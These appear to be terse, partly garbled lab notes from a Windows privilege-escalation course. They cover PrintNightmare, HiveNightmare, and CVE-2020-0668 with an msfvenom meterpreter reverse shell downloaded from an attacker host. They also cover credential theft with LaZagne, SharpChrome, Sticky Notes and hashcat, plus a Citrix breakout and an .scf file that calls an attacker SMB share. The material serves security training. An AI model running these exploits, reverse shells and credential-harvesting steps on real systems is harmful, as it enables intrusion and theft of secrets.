<ol><li>Modifiable Registry Autorun Binary</li></ol>
<pre><code class="language-powershell">Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl</code></pre>
<pre><code>icacls &lt;startup program path&gt;</code></pre>
<h2>Kernel Exploits</h2>
<p><strong>HTB Windows </strong> <strong>3 </strong> <strong><code>NT AUTHORITY\SYSTEM</code></strong> <strong>Administrator Desktop</strong> flag</p>
<ol><li><strong>HiveNightmare / SeriousSam</strong></li></ol>
<ul><li>shadow <code>SAM / SYSTEM / SECURITY</code></li></ul>
<ol><li><strong>PrintNightmare</strong></li></ol>
<ul><li>DLL</li></ul>
<ol><li><strong>CVE-2020-0668 + Mozilla Maintenance Service</strong></li></ol>
<ul><li>SYSTEM</li><li>SYSTEM shell</li></ul>
<h3>PrintNightmare</h3>
<h4>Spooler</h4>
<pre><code class="language-powershell">PowerShell</code></pre>
<pre><code>ls \\localhost\pipe\spoolss</code></pre>
<hr />
<pre><code class="language-powershell">Set-ExecutionPolicy Bypass -Scope Process</code></pre>
<hr />
<pre><code class="language-powershell">Import-Module C:\Tools\CVE-2021-1675.ps1 Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"</code></pre>
<ul><li>created payload</li></ul>
<ul><li>added user hacker as local administrator</li></ul>
<hr />
<pre><code class="language-cmd">net user hacker</code></pre>
<pre><code class="language-cmd">net localgroup administrators</code></pre>
<hr />
<h4>shell</h4>
<ul><li><code>hacker</code></li></ul>
<ul><li><code>Pwnd1234!</code></li></ul>
<pre><code class="language-cmd">runas /user:hacker cmd</code></pre>
<hr />
<h4>shell</h4>
<pre><code class="language-powershell">Start-Process cmd -Verb RunAs</code></pre>
<hr />
<h4>flag</h4>
<pre><code class="language-cmd">type C:\Users\Administrator\Desktop\flag.txt</code></pre>
<pre><code class="language-cmd">dir C:\Users\Administrator\Desktop</code></pre>
<hr />
<h3>HiveNightmare / SeriousSam</h3>
<hr />
<h4>SAM</h4>
<pre><code class="language-cmd">icacls C:\Windows\System32\config\SAM</code></pre>
<pre><code>BUILTIN\Users:(I)(RX)</code></pre>
<hr />
<h4>HiveNightmare</h4>
<pre><code class="language-cmd">.\HiveNightmare.exe</code></pre>
<ul><li><code>SAM-xxxx-xx-xx</code></li></ul>
<ul><li><code>SYSTEM-xxxx-xx-xx</code></li></ul>
<ul><li><code>SECURITY-xxxx-xx-xx</code></li></ul>
<hr />
<p>Kali impacket</p>
<pre><code class="language-shell">impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local</code></pre>
<hr />
<ul><li>PTH</li></ul>
<ul><li>SMB / WinRM / PsExec</li></ul>
<hr />
<h3>CVE-2020-0668 + Mozilla Maintenance Service</h3>
<pre><code class="language-cmd">whoami /priv</code></pre>
<hr />
<h4>Mozilla Maintenance Service</h4>
<pre><code class="language-cmd">icacls "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"</code></pre>
<pre><code>BUILTIN\Users:(I)(RX)</code></pre>
<hr />
<h4>exe</h4>
<pre><code class="language-shell">msfvenom</code></pre>
<pre><code class="language-shell">msfvenom -p windows/x64/meterpreter/reverse_https LHOST=&lt;VPN_IP&gt; LPORT=8443 -f exe &gt; maintenanceservice.exe</code></pre>
<hr />
<h4>HTTP</h4>
<pre><code class="language-shell">python3 -m http.server 8080</code></pre>
<hr />
<h4>exe</h4>
<pre><code class="language-powershell">PowerShell</code></pre>
<pre><code class="language-powershell">wget http://&lt;VPN_IP&gt;:8080/maintenanceservice.exe -O C:\Users\htb-student\Desktop\maintenanceservice.exe
wget http://&lt;VPN_IP&gt;:8080/maintenanceservice.exe -O C:\Users\htb-student\Desktop\maintenanceservice2.exe</code></pre>
<hr />
<h4>CVE-2020-0668</h4>
<pre><code>exploit C:\Tools\CVE-2020-0668\</code></pre>
<pre><code class="language-cmd">C:\Tools\CVE-2020-0668\CVE-2020-0668.exe C:\Users\htb-student\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"</code></pre>
<ul><li><code>Moving ...</code></li></ul>
<ul><li><code>Creating symbol links</code></li></ul>
<ul><li><code>Updating ... Tracing ...</code></li></ul>
<ul><li><code>Done!</code></li></ul>
<hr />
<pre><code class="language-cmd">icacls "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"</code></pre>
<pre><code>(F)</code></pre>
<p>Full Control</p>
<hr />
<h4>exe</h4>
<p><strong>cmd.exe</strong> PowerShell</p>
<pre><code class="language-cmd">copy /Y C:\Users\htb-student\Desktop\maintenanceservice2.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"</code></pre>
<hr />
<h4>handler</h4>
<p><code>handler.rc</code></p>
<pre><code>use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST &lt;VPN_IP&gt;
set LPORT 8443
exploit</code></pre>
<pre><code class="language-shell">sudo msfconsole -r handler.rc</code></pre>
<hr />
<h4>Mozilla</h4>
<pre><code class="language-cmd">net start MozillaMaintenance</code></pre>
<pre><code>The service is not responding to the control function</code></pre>
<hr />
<h4>msfconsole SYSTEM session</h4>
<pre><code>Meterpreter session opened ...</code></pre>
<pre><code>getuid</code></pre>
<pre><code>NT AUTHORITY\SYSTEM</code></pre>
<hr />
<h4>flag</h4>
<p>meterpreter</p>
<pre><code>shell
type C:\Users\Administrator\Desktop\flag.txt</code></pre>
<pre><code class="language-cmd">dir C:\Users\Administrator\Desktop</code></pre>
<h2>Credential Theft</h2>
<h3>Credential</h3>
<ol><li><strong> </strong></li></ol>
<pre><code>PS C:\htb&gt; findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml</code></pre>
<ol><li><strong> </strong></li></ol>
<pre><code class="language-powershell">PS C:\htb&gt; gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password 

Password1234!</code></pre>
<p>Unattended installation files <code>unattend.xml</code> base64</p>
<ol><li><strong>Unattended </strong></li></ol>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;unattend xmlns="urn:schemas-microsoft-com:unattend"&gt;
    &lt;settings pass="specialize"&gt;
        &lt;component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
            &lt;AutoLogon&gt;
                &lt;Password&gt;
                    &lt;Value&gt;local_4dmin_p@ss&lt;/Value&gt;
                    &lt;PlainText&gt;true&lt;/PlainText&gt;
                &lt;/Password&gt;
                &lt;Enabled&gt;true&lt;/Enabled&gt;
                &lt;LogonCount&gt;2&lt;/LogonCount&gt;
                &lt;Username&gt;Administrator&lt;/Username&gt;
            &lt;/AutoLogon&gt;
            &lt;ComputerName&gt;*&lt;/ComputerName&gt;
        &lt;/component&gt;
    &lt;/settings&gt;</code></pre>
<p>Windows 10 Powershell 5.0 PowerShell</p>
<ol><li><strong>Powershell </strong></li></ol>
<ul><li><code>C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code>.</li></ul>
<p>Microsoft handy Windows Commands PDF <a href="https://download.microsoft.com/download/5/8/9/58911986-D4AD-4695-BF63-F734CD4DF8F2/ws-commands.pdf" target="_blank" rel="noreferrer"></a> wevutil</p>
<ul><li>PowerShell</li></ul>
<pre><code>PS C:\htb&gt; (Get-PSReadLineOption).HistorySavePath

C:\Users\htb-student\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></pre>
<ul><li>PowerShell</li></ul>
<pre><code class="language-powershell">PS C:\htb&gt; gc (Get-PSReadLineOption).HistorySavePath 
dir 
cd Temp 
md backups 
cp c:\inetpub\wwwroot\* .\backups\ 
Set-ExecutionPolicy Bypass -Scope Process -Force; 
[System.Net.ServicePointManager]::SecurityProtocol = 
[System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://www.powershellgallery.com/packages/MrAToolbox/1.0.1/Content/Get-IISSite.ps1')) 
. .\Get-IISsite.ps1 Get-IISsite -Server WEB02 -web "Default Web Site" 
wevtutil qe Application "/q:*[Application [(EventID=3005)]]" /f:text /rd:true 
/u:WEB02\administrator /p:5erv3rAdmin! /r:WEB02</code></pre>
<pre><code>PS C:\htb&gt;foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}

dir
cd Temp
md backups
cp c:\inetpub\wwwroot\* .\backups\
Set-ExecutionPolicy Bypass -Scope Process -Force;
[System.Net.ServicePointManager]::SecurityProtocol = 
[System.Net.ServicePointManager]::SecurityProtocol -bor 3072;
iex ((New-Object System.Net.WebClient).DownloadString('https://www.powershellgallery.com/packages/MrAToolbox/IISSite.ps1'))

.\Get-IISSite.ps1
Get-IISsite -Server WEB02 -web "Default Web Site"

wevtutil qe Application "/q:*[Application [(EventID=3005)]]" /f:text /rd:true /u:WEB02\administrator /p:5erv3rAdmin! /r:WEB02</code></pre>
<ol><li><strong>Powershell </strong></li></ol>
<pre><code># Connect-VC.ps1
# Get-Credential | Export-Clixml -Path 'C:\scripts\pass.xml'
$encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
Connect-VIServer -Server 'VC-01' -User 'bob_adm' -Password $decryptedPassword</code></pre>
<pre><code class="language-powershell">PowerShell</code></pre>
<pre><code>PS C:\htb&gt; $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
PS C:\htb&gt; $credential.GetNetworkCredential().username

bob


PS C:\htb&gt; $credential.GetNetworkCredential().password

Str0ng3ncryptedP@ss!</code></pre>
<p>Search File Contents for String - Example 1</p>
<pre><code>C:\htb&gt; cd c:\Users\htb-student\Documents &amp; findstr /SI /M "password" *.xml *.ini *.txt

stuff.txt</code></pre>
<pre><code>C:\htb&gt; findstr /si password *.xml *.ini *.txt *.config

stuff.txt:password: l#-x9r11_2_GL!</code></pre>
<pre><code>C:\htb&gt; findstr /spin "password" _._
 
stuff.txt:1:password: l#-x9r11_2_GL!</code></pre>
<pre><code class="language-powershell">PowerShell</code></pre>
<pre><code>PS C:\htb&gt; select-string -Path C:\Users\htb-student\Documents*.txt -Pattern password

stuff.txt:1:password: l#-x9r11_2_GL!</code></pre>
<pre><code>C:\htb&gt; dir /S /B _pass_.txt == _pass_.xml == _pass_.ini == _cred_ == _vnc_ == _.config_

c:\inetpub\wwwroot\web.config</code></pre>
<pre><code>C:\htb&gt; where /R C:\ *.config

c:\inetpub\wwwroot\web.config</code></pre>
<pre><code>PS C:\htb&gt; Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore</code></pre>
<p><strong> Sticky Notes </strong></p>
<pre><code>PS C:\htb&gt; Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore


    Directory: C:\inetpub\wwwroot


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/25/2021   9:59 AM            329 web.config

&lt;SNIP&gt;




    Directory: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ASP.NETWebAdminFiles


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         12/7/2019   1:12 AM           1040 web.config</code></pre>
<p><strong> StickyNotes </strong> Windows StickyNotes <code>C:\Users\&lt;user&gt;\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite</code></p>
<pre><code>PS C:\htb&gt; ls
 
 
    Directory: C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState
 
 
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/25/2021  11:59 AM          20480 15cbbc93e90a4d56bf8d9a29305b8981.storage.session
-a----         5/25/2021  11:59 AM            982 Ecs.dat
-a----         5/25/2021  11:59 AM           4096 plum.sqlite
-a----         5/25/2021  11:59 AM          32768 plum.sqlite-shm
-a----         5/25/2021  12:00 PM         197792 plum.sqlite-wal</code></pre>
<p><code>plum.sqlite*</code> DB SQLite <code>select Text from Note;</code> Note <code>Text</code></p>
<img src="assets/posts/windows-privilege-escalation/Pasted image 20260322052414.png" alt="Pasted image 20260322052414" />
<pre><code class="language-powershell">PowerShell  PowerShell PSSQLite StickNotes SQLite Note .sqlite WinRM</code></pre>
<pre><code class="language-powershell">PS C:\htb&gt; Set-ExecutionPolicy Bypass -Scope Process

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic at
https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A

PS C:\htb&gt; cd .\PSSQLite\
PS C:\htb&gt; Import-Module .\PSSQLite.psd1
PS C:\htb&gt; $db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
PS C:\htb&gt; Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
 
Text
----
\id=de368df0-6939-4579-8d38-0fda521c9bc4 vCenter
\id=e4adae4c-a40b-48b4-93a5-900247852f96
\id=1a44a631-6fff-4961-a4df-27898e9e1e65 root:Vc3nt3R_adm1n!
\id=c450fc5f-dc51-4412-b4ac-321fd41c522a Thycotic demo tomorrow at 10am</code></pre>
<pre><code class="language-powershell">Chenduoduo@htb[/htb]$  strings plum.sqlite-wal

CREATE TABLE "Note" (
"Text" varchar ,
"WindowPosition" varchar ,
"IsOpen" integer ,
"IsAlwaysOnTop" integer ,
"CreationNoteIdAnchor" varchar ,
"Theme" varchar ,
"IsFutureNote" integer ,
"RemoteId" varchar ,
"ChangeKey" varchar ,
"LastServerVersion" varchar ,
"RemoteSchemaVersion" integer ,
"IsRemoteDataInvalid" integer ,
"PendingInsightsScan" integer ,
"Type" varchar ,
"Id" varchar primary key not null ,
"ParentId" varchar ,
"CreatedAt" bigint ,
"DeletedAt" bigint ,
"UpdatedAt" bigint )'
indexsqlite_autoindex_Note_1Note
af907b1b-1eef-4d29-b238-3ea74f7ffe5caf907b1b-1eef-4d29-b238-3ea74f7ffe5c
U   af907b1b-1eef-4d29-b238-3ea74f7ffe5c
Yellow93b49900-6530-42e0-b35c-2663989ae4b3af907b1b-1eef-4d29-b238-3ea74f7ffe5c
U   93b49900-6530-42e0-b35c-2663989ae4b3


&lt; SNIP &gt;

\id=011f29a4-e37f-451d-967e-c42b818473c2 vCenter
\id=34910533-ddcf-4ac4-b8ed-3d1f10be9e61 alright*
\id=ffaea2ff-b4fc-4a14-a431-998dc833208c root:Vc3nt3R_adm1n!ManagedPosition=Yellow93b49900-6530-42e0-b35c-2663989ae4b3af907b1b-1eef-4d29-b238-3ea74f7ffe5c

&lt;SNIP &gt;</code></pre>
<pre><code class="language-shellsession">%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*</code></pre>
<ol><li><strong>Cmdkey </strong></li></ol>
<pre><code>C:\htb&gt; cmdkey /list

    Target: LegacyGeneric:target=TERMSRV/SQL01
    Type: Generic
    User: inlanefreight\bob</code></pre>
<img src="assets/posts/windows-privilege-escalation/Pasted image 20260322055123.png" alt="Pasted image 20260322055123" />
<pre><code>PS C:\htb&gt; runas /savecred /user:inlanefreight\bob "COMMAND HERE"</code></pre>
<p>SharpChrome Google Chrome cookie</p>
<ol><li><strong>Browser Credentials </strong></li></ol>
<pre><code>PS C:\htb&gt; .\SharpChrome.exe logins /unprotect

  __                 _
 (_  |_   _. ._ ._  /  |_  ._ _  ._ _   _
 __) | | (_| |  |_) \_ | | | (_) | | | (/_
                |
  v1.7.0


[*] Action: Chrome Saved Logins Triage

[*] Triaging Chrome Logins for current user



[*] AES state key file : C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State
[*] AES state key      : 5A2BF178278C85E70F63C4CC6593C24D61C9E2D38683146F6201B32D5B767CA0


--- Chrome Credential (Path: C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data) ---

file_path,signon_realm,origin_url,date_created,times_used,username,password
C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data,https://vc01.inlanefreight.local/,https://vc01.inlanefreight.local/ui,4/12/2021 5:16:52 PM,13262735812597100,bob@inlanefreight.local,Welcome1</code></pre>
<ol><li><strong>Password Managers </strong></li></ol>
<p>KeePass <code>keepass2john.py</code> Hashcat</p>
<pre><code>Chenduoduo@htb[/htb]$ python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx ILFREIGHT_Help_Desk:$keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d5820ca1718877889f44e2c4c202c62f5fd5*2e8b53e1b11a2af306eb8ac424110c63029e03745d3465cf2e03086bc6f483d0*7df525a2b843990840b249324d55b6ce*75e830162befb17324d6be83853dbeb309ee38475e9fb42c1f809176e9bdf8b8*63fdb1c4fb1dac9cb404bd15b0259c19ec71a8b32f91b2aaaaf032740a39c154</code></pre>
<pre><code>Chenduoduo@htb[/htb]$ hashcat -m 13400 keepass_hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt

hashcat (v6.1.1) starting...

&lt;SNIP&gt;

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d5820ca1718877889f44e2c4c202c62f5fd5*2e8b53e1b11a2af306eb8ac424110c63029e03745d3465cf2e03086bc6f483d0*7df525a2b843990840b249324d55b6ce*75e830162befb17324d6be83853dbeb309ee38475e9fb42c1f809176e9bdf8b8*63fdb1c4fb1dac9cb404bd15b0259c19ec71a8b32f91b2aaaaf032740a39c154:panther1
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: KeePass 1 (AES/Twofish) and KeePass 2 (AES)
Hash.Target......: $keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d...39c154
Time.Started.....: Fri Aug  6 11:17:47 2021 (22 secs)
Time.Estimated...: Fri Aug  6 11:18:09 2021 (0 secs)
Guess.Base.......: File (/opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      276 H/s (4.79ms) @ Accel:1024 Loops:16 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 6144/14344385 (0.04%)
Rejected.........: 0/6144 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:59984-60000
Candidates.#1....: 123456 -&gt; iheartyou

Started: Fri Aug  6 11:17:45 2021
Stopped: Fri Aug  6 11:18:11 2021</code></pre>
<p>Microsoft Exchange MailSniper “pass” “creds” “credentials”</p>
<ol><li><strong>Email</strong></li></ol>
<ol><li>credentials</li></ol>
<ul><li>LaZagne</li></ul>
<pre><code>PS C:\htb&gt; .\lazagne.exe -h

usage: lazagne.exe [-h] [-version]
                   {chats,mails,all,git,svn,windows,wifi,maven,sysadmin,browsers,games,multimedia,memory,databases,php}
                   ...
                   
|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

positional arguments:
  {chats,mails,all,git,svn,windows,wifi,maven,sysadmin,browsers,games,multimedia,memory,databases,php}
                        Choose a main command
    chats               Run chats module
    mails               Run mails module
    all                 Run all modules
    git                 Run git module
    svn                 Run svn module
    windows             Run windows module
    wifi                Run wifi module
    maven               Run maven module
    sysadmin            Run sysadmin module
    browsers            Run browsers module
    games               Run games module
    multimedia          Run multimedia module
    memory              Run memory module
    databases           Run databases module
    php                 Run php module

optional arguments:
  -h, --help            show this help message and exit
  -version              laZagne version</code></pre>
<p>LaZagne</p>
<pre><code>PS C:\htb&gt; .\lazagne.exe all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

########## User: jordan ##########

------------------- Winscp passwords -----------------

[+] Password found !!!
URL: transfer.inlanefreight.local
Login: root
Password: Summer2020!
Port: 22

------------------- Credman passwords -----------------

[+] Password found !!!
URL: dev01.dev.inlanefreight.local
Login: jordan_adm
Password: ! Q A Z z a q 1

[+] 2 passwords have been found.

For more information launch it again with the -v option

elapsed time = 5.50499987602</code></pre>
<p>SessionGopher PuTTY WinSCP FileZilla SuperPuTTY RDP PowerShell <code>HKEY_USERS</code> PuTTY .ppk .rdp RSA .sdtid</p>
<ol><li>credentials</li></ol>
<p>SessionGopher</p>
<pre><code>PS C:\htb&gt; Import-Module .\SessionGopher.ps1
 
PS C:\Tools&gt; Invoke-SessionGopher -Target WINLPE-SRV01
 
          o_
         /  ".   SessionGopher
       ,"  _-"
     ,"   m m
  ..+     )      Brandon Arvanaghi
     \`m..m       Twitter: @arvanaghi | arvanaghi.com
 
[+] Digging on WINLPE-SRV01...
WinSCP Sessions
 
 
Source   : WINLPE-SRV01\htb-student
Session  : Default%20Settings
Hostname :
Username :
Password :
 
 
PuTTY Sessions
 
 
Source   : WINLPE-SRV01\htb-student
Session  : nix03
Hostname : nix03.inlanefreight.local
 

 
SuperPuTTY Sessions
 
 
Source        : WINLPE-SRV01\htb-student
SessionId     : NIX03
SessionName   : NIX03
Host          : nix03.inlanefreight.local
Username      : srvadmin
ExtraArgs     :
Port          : 22
Putty Session : Default Settings</code></pre>
<p>Windows Autologon Windows</p>
<ul><li>Windows AutoLogon</li></ul>
<pre><code class="language-cmd">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows 
NT\CurrentVersion\Winlogon</code></pre>
<p><code>AdminAutoLogon</code>—— Autologon “1”</p>
<p><code>DefaultUserName</code> -</p>
<p><code>DefaultPassword</code> -</p>
<ul><li><code>AdminAutoLogon</code> - Determines whether Autologon is enabled or disabled. A value of "1" means it is enabled.</li><li><code>DefaultUserName</code> - Holds the value of the username of the account that will automatically log on.</li><li><code>DefaultPassword</code> - Holds the value of the password for the user account specified previously.</li></ul>
<ul><li>reg.exe Autologon</li></ul>
<pre><code>C:\htb&gt;reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    
    &lt;SNIP&gt;
    
    AutoAdminLogon    REG_SZ    1
    DefaultUserName    REG_SZ    htb-student
    DefaultPassword    REG_SZ    HTB_@cademy_stdnt!</code></pre>
<p><strong><code> </code></strong> Windows Autologon Sysinternals suite Autologon.exe LSA</p>
<ol><li><strong>Putty</strong></li></ol>
<pre><code>Computer\HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\&lt;SESSION NAME&gt;</code></pre>
<pre><code>PS C:\htb&gt; reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions

HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh</code></pre>
<pre><code>PS C:\htb&gt; reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh

HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
    Present    REG_DWORD    0x1
    HostName    REG_SZ
    LogFileName    REG_SZ    putty.log
    
  &lt;SNIP&gt;
  
    ProxyDNS    REG_DWORD    0x1
    ProxyLocalhost    REG_DWORD    0x0
    ProxyMethod    REG_DWORD    0x5
    ProxyHost    REG_SZ    proxy
    ProxyPort    REG_DWORD    0x50
    ProxyUsername    REG_SZ    administrator
    ProxyPassword    REG_SZ    1_4m_th3_@cademy_4dm1n!</code></pre>
<ol><li>Wifi Passwords</li></ol>
<pre><code>C:\htb&gt; netsh wlan show profile

Profiles on interface Wi-Fi:

Group policy profiles (read only)
---------------------------------
    &lt;None&gt;

User profiles
-------------
    All User Profile     : Smith Cabin
    All User Profile     : Bob's iPhone
    All User Profile     : EE_Guest
    All User Profile     : EE_Guest 2.4
    All User Profile     : ilfreight_corp</code></pre>
<pre><code>C:\htb&gt; netsh wlan show profile ilfreight_corp key=clear

Profile ilfreight_corp on interface Wi-Fi:
=======================================================================

Applied: All User Profile

Profile information
-------------------
    Version                : 1
    Type                   : Wireless LAN
    Name                   : ilfreight_corp
    Control options        :
        Connection mode    : Connect automatically
        Network broadcast  : Connect only if this network is broadcasting
        AutoSwitch         : Do not switch to other networks
        MAC Randomization  : Disabled

Connectivity settings
---------------------
    Number of SSIDs        : 1
    SSID name              : "ilfreight_corp"
    Network type           : Infrastructure
    Radio type             : [ Any Radio Type ]
    Vendor extension          : Not present

Security settings
-----------------
    Authentication         : WPA2-Personal
    Cipher                 : CCMP
    Authentication         : WPA2-Personal
    Cipher                 : GCMP
    Security key           : Present
    Key Content            : ILFREIGHTWIFI-CORP123908!

Cost settings
-------------
    Cost                   : Unrestricted
    Congested              : No
    Approaching Data Limit : No
    Over Data Limit        : No
    Roaming                : No
    Cost Source            : Default</code></pre>
<h2>Citrix Breakout</h2>
<p>Breakout</p>
<ol><li>Gain access to a <code>Dialog Box</code>.</li><li>Exploit the Dialog Box to achieve <code>command execution</code>.</li><li><code>Escalate privileges</code> to gain higher levels of access.</li></ol>
<p>RDP <code>http://humongousretail.com/remote/</code> <code> </code> Citrix <code>launch.ica</code></p>
<pre><code>Username: pmorgan
Password: Summer1Summer!
  Domain: htb.local
  
Import-Module C:\Users\pmorgan\Desktop\PowerUp.ps1  
Get-RegistryKeyValue -Key 'HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer' -ValueName 'AlwaysInstallElevated'  
Get-RegistryKeyValue -Key 'HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer' -ValueName 'AlwaysInstallElevated'</code></pre>
<img src="assets/posts/windows-privilege-escalation/Pasted image 20260322063450.png" alt="Pasted image 20260322063450" />
<img src="assets/posts/windows-privilege-escalation/Pasted image 20260322063517.png" alt="Pasted image 20260322063517" />
<p>Windows UNC <code>\\127.0.0.1\c$\users\pmorgan</code> File-Type <code> </code></p>
<h3>SMB share</h3>
<p>Impacket <code>smbserver.py</code> Ubuntu SMB</p>
<pre><code>root@ubuntu:/home/htb-student/Tools# smbserver.py -smb2support share $(pwd)

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed</code></pre>
<img src="assets/posts/windows-privilege-escalation/Pasted image 20260322063739.png" alt="Pasted image 20260322063739" />
<pre><code class="language-c">#include &lt;stdlib.h&gt;
int main() {
  system("C:\\Windows\\System32\\cmd.exe");
}</code></pre>
<img src="assets/posts/windows-privilege-escalation/Pasted image 20260322063831.png" alt="Pasted image 20260322063831" />
<h3>Explorer</h3>
<img src="assets/posts/windows-privilege-escalation/Pasted image 20260322063901.png" alt="Pasted image 20260322063901" />
<img src="assets/posts/windows-privilege-escalation/Pasted image 20260322063935.png" alt="Pasted image 20260322063935" />
<p>Simpleregedit Uberregedit SmallRegistryEditor GUI Windows</p>
<ol><li><code>Right-click</code> the desired shortcut.</li><li>Select <code>Properties</code>.</li></ol>
<img src="assets/posts/windows-privilege-escalation/Pasted image 20260322064024.png" alt="Pasted image 20260322064024" />
<p>Within the <code>Target</code> field, modify the path to the intended folder for access.</p>
<img src="assets/posts/windows-privilege-escalation/Pasted image 20260322064042.png" alt="Pasted image 20260322064042" />
<ol><li>Execute the Shortcut and cmd will be spawned</li></ol>
<img src="assets/posts/windows-privilege-escalation/Pasted image 20260322064055.png" alt="Pasted image 20260322064055" />
<pre><code>xfreerdp /v:10.129.205.244 /u:htb-student /p:HTB_@cademy_stdnt!</code></pre>
<h2>Additional Techniques</h2>
<img src="assets/posts/windows-privilege-escalation/Pasted image 20260322164838.png" alt="Pasted image 20260322164838" />
<img src="assets/posts/windows-privilege-escalation/Pasted image 20260322164844.png" alt="Pasted image 20260322164844" />
<h4>Process Command Line</h4>
<pre><code>while($true)
{

  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2

}</code></pre>
<pre><code>[Shell]
Command=2
IconFile=\\10.10.15.137\share\test.ico
[Taskbar]
Command=ToggleDesktop</code></pre>
<h3>Pillaging</h3>
